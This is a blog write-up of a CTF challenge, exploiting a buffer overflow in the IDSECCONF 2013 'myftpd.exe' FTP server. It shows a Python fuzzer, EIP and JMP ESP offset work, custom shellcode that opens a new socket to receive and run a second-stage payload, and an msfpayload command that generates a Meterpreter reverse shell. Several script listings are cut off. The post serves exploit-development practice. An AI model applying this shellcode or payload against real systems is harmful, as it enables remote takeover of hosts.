Lots of people have asked for a copy of the binary so that they can play along with this. I&rsquo;ve contacted Ammar and he has said it&rsquo;s ok for me to provide it here. So for those that are keen to have a go at this themselves, have at it!.

On with the Show

With OSCE out of the way and the family in need of a break from me doing study and certifications, I decided to turn my hand to some fun exploit challenges to keep up the practice. To a wannabe bug exploiter such as myself, there are plenty of options out there which are great for fun and practice. Some of those options are:


Downloading an application with a known vulnerability and exploit and practising on that.
Downloading a proof of concept crash from ExploitDB and turning it into a full exploit.
Reading sites such as Corelan and Fuzzy Security, who both have great exploit tutorials. However, instead of reading through the walk-throughs, download the vulnerable applications and attempt to exploit them yourself.
Getting some &ldquo;exploitme&rdquo; style challenges from some bygone CTFs. A great place to go is ShellStorm, which contains an archive of lots of these.


On this particular day I thought I&rsquo;d try one of the harder exploitme challenges and it just so happened that something appeared in my Twitter feed that pointed me to Ammar&rsquo;s post discussing a level 500 exploit challenge from the IDSECCONF 2013 CTF. To quote Ammar:


&hellip; during the IDSECCONF offline CTF, none of the team were able to wrap
up a working remote exploit, although one team were able to get [the]
correct offset to overwrite EIP &hellip;


This had the hallmarks of being tricky and fun! I asked Ammar if the binary was still available and he kindly made it available for download (head to his site if you would like to have a shot at it yourself).

What follows is my dissection of the binary, along with my approach to exploiting it so that it would allow the attacker to submit any payload including reverse Meterpreter shells, bind shells and VNC injection. If you&rsquo;re keen to take this challenge on by yourself, please don&rsquo;t read this as it&rsquo;s a blatant spoiler. Otherwise, let&rsquo;s get stuck in!">

<p>Lots of people have asked for a copy of the binary so that they can play along with this. I&rsquo;ve contacted <a href="https://twitter.com/y3dips">Ammar</a> and he has said it&rsquo;s ok for me to provide it here. So for those that are keen to have a go at this themselves, <a href="/uploads/2014/03/myftpd.exe">have at it!</a>.</p>

<h2 id="on-with-the-show">On with the Show</h2>

<p>With <a href="http://buffered.io/posts/osce-and-me/">OSCE</a> out of the way and the family in need of a break from me doing study and certifications, I decided to turn my hand to some fun exploit challenges to keep up the practice. To a wannabe bug exploiter such as myself, there are plenty of options out there which are great for fun and practice. Some of those options are:</p>

<ul>
<li>Downloading an application with a known vulnerability and exploit and practising on that.</li>
<li>Downloading a proof of concept crash from <a href="http://exploit-db.com/">ExploitDB</a> and turning it into a full exploit.</li>
<li>Reading sites such as <a href="https://www.corelan.be/">Corelan</a> and <a href="http://www.fuzzysecurity.com/">Fuzzy Security</a>, who both have great exploit tutorials. However, instead of reading through the walk-throughs, download the vulnerable applications and attempt to exploit them yourself.</li>
<li>Getting some &ldquo;exploitme&rdquo; style challenges from some bygone <a href="https://en.wikipedia.org/wiki/Capture_the_flag">CTFs</a>. A great place to go is <a href="http://www.shell-storm.org/">ShellStorm</a>, which contains an archive of lots of these.</li>
</ul>

<p>On this particular day I thought I&rsquo;d try one of the harder exploitme challenges and it just so happened that something appeared in my Twitter feed that pointed me to <a href="http://clog.ammar.web.id/2013/06/idsecconf-2013-ctff-offline-challenge.html">Ammar</a>&rsquo;s post discussing a level <code>500</code> exploit challenge from the <a href="http://2013.idsecconf.org/">IDSECCONF 2013 CTF</a>. To quote Ammar:</p>

<blockquote>
<p>&hellip; during the IDSECCONF offline CTF, none of the team were able to wrap
up a working remote exploit, although one team were able to get [the]
correct offset to overwrite EIP &hellip;</p>
</blockquote>

<p>This had the hallmarks of being tricky and fun! I asked Ammar if the binary was still available and he kindly made it available for download (head to his site if you would like to have a shot at it yourself).</p>

<p>What follows is my dissection of the binary, along with my approach to exploiting it so that it would allow the attacker to submit <em>any</em> payload including reverse <a href="https://github.com/rapid7/meterpreter">Meterpreter</a> shells, bind shells and VNC injection. If you&rsquo;re keen to take this challenge on by yourself, please don&rsquo;t read this as it&rsquo;s a blatant spoiler. Otherwise, let&rsquo;s get stuck in!</p>

<h2 id="the-tools">The Tools</h2>

<p>For this exploit, I used:</p>

<ul>
<li>The <a href="https://www.immunityinc.com/products-immdbg.shtml">Immunity Debugger</a>. I know I really need to get back into [Windbg][] now that OSCE is over, but cut me some slack.</li>
<li>The <a href="http://redmine.corelan.be/projects/mona">Mona.py</a> plug-in written by the legendary <a href="https://twitter.com/corelanc0d3r">Corelanc0d3r</a>.</li>
<li>The machine I did this on was a Windows XP SP3 machine. The target machine for the CTF was apparently XP SP2, hence my decision to use this instead of Windows 7.</li>
</ul>

<p>If you want to follow along, get yourself these tools, configure them and have them ready to go.</p>

<h2 id="the-ftp-server">The FTP Server</h2>

<p>The zip file that I downloaded contained one binary called <code>myftpd.exe</code> with a configuration file called <code>passwd.conf</code>. I started by opening the <code>passwd.conf</code> file to see what was inside:</p>

<pre><code class="language-txt">test|test|c:|0
</code></pre>

<p>Obviously this is a list of users that are able to access the application and so it&rsquo;s probably safe to assume that a valid login is <code>test</code>/<code>test</code>. Upon launching the application we&rsquo;re presented with a rather nice black console which is used to show activity on the server:</p>

<p><img src="/uploads/2014/03/ftp-server-running.png" alt="Running the myftpd.exe" /></p>

<p>Nothing too crazy going on here. We can see that it handles the basic commands, but there&rsquo;s nothing too juicy going on. Given that we know this thing is supposed to be hosed remotely, let&rsquo;s get a basic fuzzing script together and see if we can break it. I decided to go with something custom and very rudimentary to begin with, and the reason for this was because it&rsquo;s a CTF exploitme, and I felt that the goal here was to get past a quirky exploit rather than spend a long period of time fuzzing. My guess paid off pretty quickly and it saved me from having to worry about more complicated fuzzing techniques and applications.</p>

<h2 id="fuzzing-the-server">Fuzzing the Server</h2>

<p>We know that the first thing we need to do when signing in to the server is to issue the <code>USER</code> command, so for me this was the first logical point of call. I whipped up a quick python script which generated bigger and bigger user names to throw at the application. It looks like this:</p>

<pre><code class="language-python">#!/usr/bin/python

import socket

host = '10.1.10.34'
port = 21

def fuzz(payload):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

print &quot;[*] Fuzzing {0}:{1} ...&quot;.format(host, port)
for i in range(1, 100):
  name = &quot;A&quot; * (i * 0x10)
  command = &quot;USER {0}\r\n&quot;.format(name)
  print &quot;[*] Username {0} chars, Command {1} chars...&quot;.format(len(name), len(command))
  fuzz(command)
</code></pre>

<p>As you can see this script is really simple, and just increments the size of the payload to deploy until things break. I went ahead and attached Immunity to the server and kicked off my script. To my annoyance the developers of application has put a breakpoint in the code when a user connects. Obviously the goal here was to stop us from fuzzing under a debugger:</p>

<p><img src="/uploads/2014/03/01-int3.png" alt="Debug breakpoint while fuzzing" /></p>

<p>To get around this problem I just modified the assembly inline using Immunity so that the breakpoint (<code>CC</code>) instruction was instead a NOP (<code>90</code>) instruction like so:</p>

<p><img src="/uploads/2014/03/02-nop.png" alt="Changed to NOP" /></p>

<p>With this out of the way the script ran nicely. Until&hellip;</p>

<pre><code class="language-txt">$ ./fuzz.py
[*] Fuzzing 10.1.10.34:21 ...
[*] Username 16 chars, Command 23 chars...
[*] Username 32 chars, Command 39 chars...

[*] Username 288 chars, Command 295 chars...
[*] Username 304 chars, Command 311 chars...
</code></pre>

<p>When the username hit <code>304</code> characters, things turned bad for the server. Immunity showed the following information about the registers:</p>

<pre><code class="language-txt">EAX 00000000
ECX 0024A9C0

EBP 41414141
ESI 41414141
EDI 41414141
EIP 41414141
</code></pre>

<p>At this point it looks like we have a &ldquo;vanilla&rdquo; <code>EIP</code> overwrite. Taking a look at the stack window we can see something interesting:</p>

<pre><code class="language-txt">00B5FF90   00000000  ....

 -- this is the end of the memory region --
</code></pre>

<p>From the above dump we can see that there&rsquo;s a chance we can redirect the flow of code to something we control by pointing <code>EIP</code> to a known instruction for either a <code>PUSH ESP # RET</code>, <code>CALL ESP</code> or <code>JMP ESP</code> instruction. Before we look into that, it&rsquo;s worth noting that this memory dump ends at <code>00B5FFFC</code>, which means that we probably can&rsquo;t write too much information otherwise we&rsquo;ll crash the process in a different way. The other thing that stands out here is that the first part of the payload has be set to zero (we can&rsquo;t see <code>USER</code> anywhere here) so it would appear that the front part of the buffer is clobbered by something before we get here.</p>

<p>I changed my fuzzing script a little and did some trial and error. It turns out that the use of <code>USER</code> isn&rsquo;t actually required to cause the crash. I also found that the payload size could only be up to <code>365</code> characters, as any more would result in an exception.</p>

<p>I fired a command which was simply a string of <code>365</code> <code>A</code> characters without a <code>\r\n</code> suffix. This is what the stack looked like:</p>

<p>What&rsquo;s interesting here is that a <code>NULL</code> byte is being written to memory at <code>00B5FFFF</code>, just something to bear in mind later on.</p>

<h2 id="controlling-eip">Controlling EIP</h2>

<p>The next thing to do is to start crafting an exploit, and in order to execute our own code we need to control <code>EIP</code>. First we need to know the offset of the bytes that overwrite <code>EIP</code> and for this we&rsquo;ll use the tried and true <code>pattern_create.rb</code> along with its cohort <code>pattern_offset.rb</code>. However, I&rsquo;m not a fan of having massive exploit payloads directly pasted into my source code, so instead I read the files in. We create the pattern file like so:</p>

<pre><code class="language-txt">$ pattern_create.rb 356 &gt; pattern.txt
</code></pre>

<p>We then begin our exploit with a simple shell that looks like this:</p>

<pre><code class="language-python">#!/usr/bin/python

import socket

host = '10.1.10.34'
port = 21

def read_file(path):
  with open(path, 'r') as f:

<p>For now we&rsquo;re only interested in the offset of <code>EIP</code> and <code>ESP</code>, and the point at which the <code>NULL</code> bytes stop being written; if we need others then we will figure them out later:</p>

<p>Here we can see that EIP and ESP are actually quite close together. Let&rsquo;s modify our exploit to see if we have our offsets correct (we&rsquo;ll worry about the shellcode start later). The script now looks like this:</p>

<p>Our offsets are spot on. Next we need to find an address that we can use to overwrite ESP with. Preferably we&rsquo;ll use a <code>JMP ESP</code> instruction instead of the other options because this will not modify the content of memory around <code>ESP</code> (which would be bad in case it overwrites stuff that&rsquo;s important to us). Here we&rsquo;ll use <strong>Mona.py</strong> within immunity to give us a list of addresses that we can use.</p>

<p>Ideally our exploit would not be tied to a given platform, so we would ultimately like to find an address which isn&rsquo;t tied to any Windows DLLs. We start by searching for jump instructions within the <code>myftpd</code> process itself because we know this will translate across platforms:</p>

<pre><code class="language-txt">!mona jmp -r ESP -m myftpd

<p>Unfortunately for us, all we get is:</p>

<p>Isn&rsquo;t that just sweet? Lots of options here, though it does tie us down to a particular platform and using addresses like these will not work on Vista and later thanks to ASLR. Perhaps we can come up with a solution to this down the track.</p>

<p>I dug a little deeper in <code>jmp.txt</code> which contained all the addresses, and decided to settle on <code>0x7e4456f7</code> (a <code>JMP ESP</code> instruction) which is located in <code>user32.dll</code>. I chose this one because the only byte that isn&rsquo;t in the <code>ASCII</code> table is the last one, and it was my attempt and minimising the possibility of a bad character causing problems. I modified the exploit so that <code>EIP</code> would contain this value, and changed the code in <code>ESP</code> so that it would break once the jump had been performed. I also starting building in the support for multiple platforms for easy adjustment later on.</p>

<p>&ldquo;Wonderful&rdquo;, as <a href="https://twitter.com/kalilinux">muts</a> would say. We can see that <code>ESP</code> contains the breakpoint instructions and the first of those instructions has been hit, which indicates that our <code>EIP</code> overwrite worked and we now have control.</p>

<h2 id="getting-a-shell">Getting a shell</h2>

<p>If it isn&rsquo;t already clear, we don&rsquo;t really have that much space to play in. Our shellcode space starts at <code>266</code>, ends at <code>365</code> and has a 4-byte block taken out of the middle of it which contains the <code>EIP</code> overwrite and another 4 bytes tucked away between <code>ESP</code> and <code>EIP</code>.

<p>Clearly we can&rsquo;t fit a standard useful payload in here, plus with such limitations it flies in the face of our goal of being able to invoke <em>any</em> payload we wish from the attacker&rsquo;s side. We need to consider other options.</p>

<h3 id="egghunter">Egghunter?</h3>

<p>Now the first thing that people tend to do in situations like this is try to jam an egghunter of some description into this small area and use that to find a payload that was uploaded earlier on. This was the next step that I took, however I wasn&rsquo;t able to get it working for two reasons:</p>

<ol>
<li>I couldn&rsquo;t find a way of persisting the egg into memory prior to executing this payload.</li>
<li>There are a number of bad characters which make it hard to fit the encoded egghunter into this area of memory.</li>
</ol>

<p>Also, as handy as the egghunter approach is, it always feels like cheating. Plus if we want to support other platforms, such as WOW64, we&rsquo;d have to have a much bigger cross-platform egghunter which would never fit.</p>

<p>At this point I decided not to go with the egghunter approach and attempt to find something else.</p>

<h3 id="socket-reuse">Socket reuse?</h3>

<p>The FTP server already has a socket open to the attacker, the only reason we can&rsquo;t execute our own payloads is because the FTP server doesn&rsquo;t give us space and isn&rsquo;t happy with certain characters. If we were to control the call to <code>recv</code> we could avoid both of these issues. This was the approach that I thought I would consider diving into.</p>

<p>Unfortunately for us, there is one killer issue that voids this option. That is, our shellcode does not actually execute until <em>after</em> the server closes the socket. If the socket gets destroyed prior to our code being run then it becomes useless to us. With this in mind, I considered finding the listen socket in memory and getting the shellcode to call <code>accept</code> on the same socket. However, this approach becomes a race between the main thread and the consumer thread. Relying on such conditions results in exploits that are unreliable, and nobody likes a dodgy sploit. They&rsquo;re as unwelcome as an I.T. recruiter at a hacker meetup.</p>

<p>Given that both of those approaches were off the cards, reusing sockets was something that I had to let go of.</p>

<h3 id="socket-construction">Socket construction!</h3>

<p>I spent a bit of time thinking and nosing around the binary to see how it behaved with a goal of seeing which things I could leverage to get a foothold. I decided to take a slightly different approach which would require me to get funky with custom shellcode (and who doesn&rsquo;t love that kind of challenge!). My thought process leading up to this point went like this:</p>

<ul>
<li>The server initialises a socket to listen on. To do so, it needs to call <code>socket</code>, <code>bind</code>, <code>listen</code> and <code>accept</code>, which means all of these functions are imported and should be readily available for use.</li>
<li>The context of the main thread would still exist when our own thread is running which means that the <code>sockaddr</code> information used would still be in memory. It turns out that this value is actually stored in a global variable located at <code>0x00407434</code> and hence we can easily get to it and tweak it to fit our needs. This would mean we could use this information rather that try to set it up ourselves.</li>
<li>We could listen on a new socket for our attacker to connect, and when it does, it reads a payload into memory using <code>recv</code> and executes it immediately.</li>
</ul>

<p>Sounds a little barmy, but a lot of fun. So with this in mind, I started to dive into the shellcode.</p>

<h2 id="shellcode-golf">Shellcode golf</h2>

<h3 id="things-to-note">Things to note</h3>

<p>Before we can dive into building our shellcode we have a few things we need to consider. First, we want our code to be as portable as possible, and hence rely on the <code>myftpd.exe</code> binary instead of other DLLs. This means that when we call functions such as <code>socket</code> we need to go via the import table instead of accessing the DLLs directly. The problem we have here is that those addresses all come in the form <code>0x0040ABCD</code>, which means we have a <code>NULL</code> byte to deal with. This is pretty easy to get around in a single case using the following method:</p>

<ol>
<li>Start by setting <code>EAX</code> to <code>0x40ABCD44</code>, which is the same as the address, shifted left by 8 bits, and the OR&rsquo;d with any valid character (<code>44</code> in this case).</li>
<li>Shift <code>EAX</code> right using the <code>SHR</code> instruction. This removes the lower order byte and zeros out the higher order byte. The effect is that you end up with <code>EAX</code> containing the value <code>0x0040ABCD</code> just as we require.</li>
</ol>

<p>Unfortunately, this approach means that we would have to use up 10 bytes for every call we make. This is because the <code>MOV</code> takes up 5 bytes, <code>SHR</code> 3 bytes, and <code>CALL</code> another 2 bytes. This is expensive! Instead we need to get smarter to reduce amount of work done.</p>

<p>We can actually use a handy trick to solve this problem. Observe the locations of the interesting functions within the <code>myftpd.exe</code> binary:</p>

<pre><code class="language-txt">0040340C   JMP DWORD PTR DS:[&lt;&amp;WS2_32.recv&gt;]        ;  WS2_32.recv
00403424   JMP DWORD PTR DS:[&lt;&amp;WS2_32.accept&gt;]      ;  WS2_32.accept
00403434   JMP DWORD PTR DS:[&lt;&amp;WS2_32.socket&gt;]      ;  WS2_32.socket
00403454   JMP DWORD PTR DS:[&lt;&amp;WS2_32.bind&gt;]        ;  WS2_32.bind
0040345C   JMP DWORD PTR DS:[&lt;&amp;WS2_32.listen&gt;]      ;  WS2_32.listen
00403DD4   JMP DWORD PTR DS:[&lt;&amp;msvcrt.malloc&gt;]      ;  msvcrt.malloc
00403EA4   JMP DWORD PTR DS:[&lt;&amp;KERNEL32.VirtualProt&gt;;  kernel32.VirtualProtect
</code></pre>

<p>We can see that these imports are close together. So we could perform the above calculation the first time we need to call a function, but from that point on we can just modify the lower-order bytes directly. The <code>MOV ?L</code> and <code>MOV ?H</code> instructions are just 2 bytes, and <code>MOV ?X</code> is 3 bytes and hence save 5 or 6 bytes per call. Excellent! We just need to pick a register that will not change across function calls, and that will allow us to operate on the two lower order bytes easy. I chose <code>EBX</code> for this purpose.</p>

<p>So with that lot in mind, let&rsquo;s get shellcoding.</p>

<h3 id="building-the-exploit-shellcode">Building the exploit shellcode</h3>

<p>At the time of the crash our registers don&rsquo;t contain anything too useful, other than <code>EAX</code> containing a <code>0</code> and <code>ESP</code> pointing to a known location in memory. However, even this is in a bad spot for us because any adjustment of the stack via the use of <code>PUSH</code> or <code>CALL</code> instructions result in the stack memory being changed. As a result we need to move <code>ESP</code> away from our shellcode prior to any work being done. Therefore our first bit of shellcode looks like this:</p>

<pre><code class="language-txt">SUB ESP, 0x7C         ; Move the stack pointer somewhere safe
</code></pre>

<p>We subtract <code>0x7C</code> bytes because:</p>

<ol>
<li>Anything more than <code>0x7F</code> results in an instruction that is 6 bytes. Also, each byte needs to be a non-bad char, which means that <code>ESP</code> would be adjusted too far away, resulting in other problems.</li>
<li>The largest stack-aligned value under <code>0x7F</code> is <code>0x7C</code>, and keeping the stack aligned for certain function calls is very important.</li>
</ol>

<p>The stack now points to somewhere in the block of zeros that overwrote our original payload. This will prove to be handy later on when we need zeros pushed onto the stack.</p>

<p>Next we need to construct a call to a new socket. This means we need to locate and call <code>socket</code> with the right parameters. To create a socket that is able to work with streams over TCP, the call would need to look like this: <code>socket(2, 1, 6);</code></p>

<p>Before we can do that we need to get the first of the functions that we&rsquo;re going to call into <code>EBX</code>, just as we discussed before:</p>

<pre><code class="language-txt">MOV EBX, 0x40343444   ; Set EBX to a mostly correct address
SHR EBX, 0x8          ; Shift EBX right by a byte to correct the address
</code></pre>

<p>We now need to push the three magic values onto the stack in the reverse order (bear in mind that <code>EAX</code> is <code>0</code> at this point):</p>

<pre><code class="language-txt">MOV AL, 6             ; Set EAX to 6
PUSH EAX
MOV AL, 1             ; Set EAX to 1
PUSH EAX
INC EAX               ; Set EAX to 2
PUSH EAX
</code></pre>

<p>With the stack parameters ready to go, we can simply call the socket function and we should see a result appear in <code>EAX</code> which indicates a valid socket handle. Let&rsquo;s take a look at our exploit up until this point:</p>

<p>Invocation shows shellcode that has just been invoked looking like this:</p>

<pre><code class="language-txt">00B5FFC0   83EC 7C          SUB ESP,7C
00B5FFC3   BB 44343440      MOV EBX,40343444
00B5FFC8   C1EB 08          SHR EBX,8
00B5FFCB   B0 06            MOV AL,6
00B5FFCD   50               PUSH EAX
00B5FFCE   B0 01            MOV AL,1
00B5FFD0   50               PUSH EAX
00B5FFD1   40               INC EAX
00B5FFD2   50               PUSH EAX
00B5FFD3   FFD3             CALL EBX
</code></pre>

<p>The registers contain the following:</p>

<pre><code class="language-txt">EAX 00000084
ECX 71AB4114 WS2_32.71AB4114
EDX 00000008
EBX 00403434 &lt;JMP.&amp;WS2_32.socket&gt;
ESP 00B5FF44
EBP 42424242
ESI 42424242
EDI 42424242
EIP 00B5FFD6
O 0  LastErr ERROR_SUCCESS (00000000)
</code></pre>

<p>So we can see that <code>EBX</code> contains the <code>socket</code> function address as we had planned, but more importantly the <code>LastErr</code> indicates success, and <code>EAX</code> contains the result of the function call which is the handle to the socket we&rsquo;ll be listening on. We need to store that handle away so that we can use it in calls to <code>bind</code>, <code>listen</code> and <code>accept</code>. Instead of pushing onto the stack we&rsquo;re going to put it in a register for easy access. <code>EDI</code> is another register that tends to persist across calls to the functions that we&rsquo;ll be calling so let&rsquo;s put it in there.</p>

<pre><code class="language-txt">MOV EDI, EAX          ; Store the socket handle somewhere else
</code></pre>

<p>Once we&rsquo;ve got the socket, we need to bind it to an address. This is where the existing global variable comes in which was used to set up the existing socket. To locate this structure in memory, all I had to do was use Immunity to locate the exiting call to <code>bind</code>. This was as simple as setting a breakpoint on the same memory address as the <code>bind</code> jump call, which is at <code>0x00403454</code>. This is invoked during start-up, and so launching the application results in the breakpoint being hit. From there we can step through a few instructions until we find ourselves back at the call site, located at address <code>0x00403134</code>. The instructions leading up to the call look like this:</p>

<pre><code class="language-txt">00403116   . 52             PUSH EDX                                 ; |Socket
00403117   . A3 38744000    MOV DWORD PTR DS:[407438],EAX            ; |
0040311C   . C74424 08 1000&gt;MOV DWORD PTR SS:[ESP+8],10              ; |
00403124   . C74424 04 3474&gt;MOV DWORD PTR SS:[ESP+4],myftpd.00407434 ; |
0040312C   . A1 30744000    MOV EAX,DWORD PTR DS:[407430]            ; |
00403131   . 890424         MOV DWORD PTR SS:[ESP],EAX               ; |
00403134   . E8 1B030000    CALL &lt;JMP.&amp;WS2_32.bind&gt;                  ; \bind
</code></pre>

<p>The second parameter to a <code>bind</code> call is the socket address structure, which means the address stored in <code>ESP+4</code> is the one we&rsquo;re interested in. Here we can see that the value being stored here is <code>myftpd.00407434</code>, which is the global variable containing the socket address.</p>

<p>We&rsquo;re going to abuse the knowledge of the location of this thing and reuse it in our call. Note that we can&rsquo;t bind to the same socket, so we&rsquo;ll just increment the socket number prior to making our call. The address is <code>0x00407434</code>, which just happens to be <code>0x4000</code> past our current <code>EBX</code> value. We&rsquo;ll abuse this fact to get the value bumped quicky, and then we&rsquo;ll increment the port number:</p>

<pre><code class="language-txt">MOV EDI, EAX          ; Store the socket handle somewhere else
MOV ECX, EBX          ; Copy EBX to ECX for munging
MOV CH, 0x74          ; Bump the address up to the right value
INC BYTE [ECX+3]      ; Update the port from 21 to 22
</code></pre>

<p>So now we&rsquo;ve bumped our port, and we have the <code>sockaddr</code> pointer in <code>ECX</code> we can now call bind. We know that the size of this structure is 16 bytes and have our socket handle ready in <code>EDI</code>. With our parameters ready to go, we can adjust <code>EBX</code> to point to <code>bind</code>, push our stuff onto the stack and make the call:</p>

<pre><code class="language-txt">MOV BL, 0x54          ; Point EBX at `bind`
PUSH 0x10             ; Push 16 for the size of the struct
PUSH ECX              ; Push the sockaddr struct pointer
PUSH EDI              ; Push the socket handle
CALL EBX              ; Invoke bind
</code></pre>

<p>OK, we&rsquo;re starting to get the hang of this. Let&rsquo;s see what our script looks like prior to running it this time:</p>

<p>And at the end of this run the registers look like this:</p>

EIP 00B5FFE7

</code></pre>

<p>This shows that <code>bind</code> returned <code>0</code> (which is good) and that the <code>LastErr</code> is success. All is well so far! All we need now are <code>listen</code>, <code>accept</code> and <code>recv</code>. <code>listen</code> is a really simple call which takes the socket handle and a backlog counter. So let&rsquo;s move <code>EBX</code> to point to this function first, then set up the stack before doing the call:</p>

<pre><code class="language-txt">MOV BL, 0x5C          ; Point EBX at `listen`
PUSH 0x7F             ; Specify a big backlog
PUSH EDI              ; Pass in the socket
CALL EBX              ; Invoke listen

<p>Making good progress. Now we need to start accepting new connections on our socket, for that we get <code>accept</code> set up. The call would normally look like <code>accept(socket, NULL, NULL)</code>, but we&rsquo;re in a great spot because <code>ESP</code> current points to the middle of bunch of zeros, which means the two <code>NULL</code> values are effectively already pushed. This means we save instructions by not pushing them. Instead, we just adjust <code>EBX</code> to point at <code>accept</code>, push our socket handle and make the call:</p>

<pre><code class="language-txt">MOV BL, 0x24          ; Point EBX at `accept`
PUSH EDI              ; Pass in the socket
CALL EBX              ; Invoke accept
</code></pre>

<p>Now this is where it starts to get interesting, because this call is a blocking call. As a result, we need to have our attacker script connect to the bind port for the script to continue. We&rsquo;ll make another call to the server on the next port (22) and for this we&rsquo;ll be sending the payload that we want executed on the server. For now, this payload will be a dummy payload, but in future it will be any payload we want. This is what the exploit looks like now:</p>

</code></pre>

<p>By now you&rsquo;ll notice that the last call blocks until our attacker script connects the second time. After this, the registers look like this:</p>

<pre><code class="language-txt">EAX 000000A4
ECX 0024A888
EDX 00000009
EBX 00403424 &lt;JMP.&amp;WS2_32.accept&gt;
ESP 00B5FF4C
EBP 42424242
ESI 42424242
EDI 00000084
EIP 00B5FFF3
O 0  LastErr ERROR_SUCCESS (00000000)
</code></pre>

<p>Another round of success, only this time we have a meaningful value in <code>EAX</code> that we need to keep. This is the <em>accept socket</em> handle, which is the handle that points to the client that has just connected. This is the handle we need to pass to <code>recv</code> in order pull data from the attacker. We don&rsquo;t need our bind socket handle any more so the first thing we do is persist this in <code>EDI</code>.</p>

<pre><code class="language-txt">MOV EDI, EAX          ; Stash the new accept socket
</code></pre>

<p>The final hurdle is the call to <code>recv</code>, but this comes with a caveat: we need to give <code>recv</code> a handle to an area of memory that is readable, writable and executable (RWX). Originally I had built this exploit to just reuse a part of the stack, but that didn&rsquo;t port too well to other operating system versions so instead, I thought allocating memory and changing its protection would make more sense. Let&rsquo;s get the <code>malloc</code> function ready, the abuse the socket handle value in <code>EAX</code> to create a sane buffer size which we push twice (one as a param to <code>malloc</code> and the other to persist the value across calls).</p>

<p>As this point we&rsquo;re out of bytes in our first block (actually, just before making the call we run out of bytes). So we need to jmp back to the start of our shellcode with a <code>JMP</code> instruction and carry on from there:</p>

<pre><code class="language-txt">MOV BX,3DD4           ; Set EBX up for the `malloc` call
MOV AH,AL             ; use the socket handle as a size fudger
PUSH EAX              ; push for size persistence for later use
CALL EBX              ; Invoke `malloc`
JMP &lt;address&gt;         ; Jmp back to the start of block 2
</code></pre>

<p>The result of <code>malloc</code> is memory which needs to be marked as executable, and that lives in <code>EAX</code>. We&rsquo;ll push this value on the stack for later use, and then set up the virtual protect call:</p>

<pre><code class="language-txt">POP ECX, PUSH ECX     ; get a copy of the size in ECX
MOV ESI, EAX          ; save the memory handle for later use
PUSH EAX              ; push the handle onto the stack as well
MOV BX,0x3EA4         ; Set EBX up for the `virtualprotect` call
LEA EAX, [ESP-0x24]   ; Calculate somewhere sane on the stack
PUSH EAX              ; Push this value as the buffer for the old protection
PUSH 0x40             ; Mark the area as RWX
PUSH ECX              ; specify the memory size to change protection on
PUSH ESI              ; Point to the memory to protect
CALL EBX              ; Invoke `VirtualProtect`
</code></pre>

<p>The beauty of this approach is that the stack is currently set up ready to call <code>recv</code> except for the socket handle, all we need to do adjust for the function and call it. We have another issue here though because the address contains an <code>0C</code> which is a bad character. So instead we use Mona.py again to tell us a reference point for <code>recv</code> using the <code>iat</code> command. This gives us an address located at <code>0x004082DC</code>. We can use this address instead and call using <code>CALL [EBX]</code> instead.</p>

<pre><code class="language-txt">MOV BX,82DC           ; Set EBX up for the `recv` call, but can't use 0C because it's &quot;bad&quot;
PUSH EDI              ; push the socket handle
</code></pre>

<p>But wait! We can&rsquo;t invoke <code>recv</code> because we have run out of space, we have to make use of the last 4 bytes we have tucked away, so to do this we need to jump ahead by 5 bytes. There we can invoke the call:</p>

<pre><code class="language-txt">CALL [EBX]            ; Call `recv`
</code></pre>

<p>And the icing on the cake, <code>ESI</code> containers the memory pointer the payload was written to, so we just jump there and off we go!</p>

<pre><code class="language-txt">JMP ESI               ; Invoke the received payload
</code></pre>

<p>If we exclude the 1 blank that is placed after block2, we literally have zero bytes left to play with. Talk about cutting it fine!</p>

<h2 id="finishing-up">Finishing up</h2>

<p>Now before our final run, we&rsquo;ll need to generate a payload that we want to execute. In my case I&rsquo;m going to use a meterpreter payload:</p>

<pre><code class="language-txt">$ msfpayload windows/meterpreter/reverse_tcp LHOST=10.1.10.40 LPORT=8000 R &gt; revmet8000.bin
</code></pre>

<p>I&rsquo;m going to use this as the content that I sent to the server at the end of the exploit. We&rsquo;ll actually pass this in on the command line from here.</p>

<p>And so with a few more adjustments and some spit&rsquo;n&rsquo;polish, we have a weaponised exploit ready to go (breakpoint free!) that looks like this:</p>

<p>Armed with this, we can set up a Meterpreter listener:</p>

<p>Adding new Windows XP based targets to this is a breeze, and is left as an exercise for the reader. I plan to do a future post on how to make this bypass ASLR, but I&rsquo;m not sure when I&rsquo;ll get to it. Writing these things up takes way longer than exploiting them in the first place.</p>

<p>I hope you enjoyed the reading. Comments and questions are always welcome, as are corrections for fails and typos.</p>
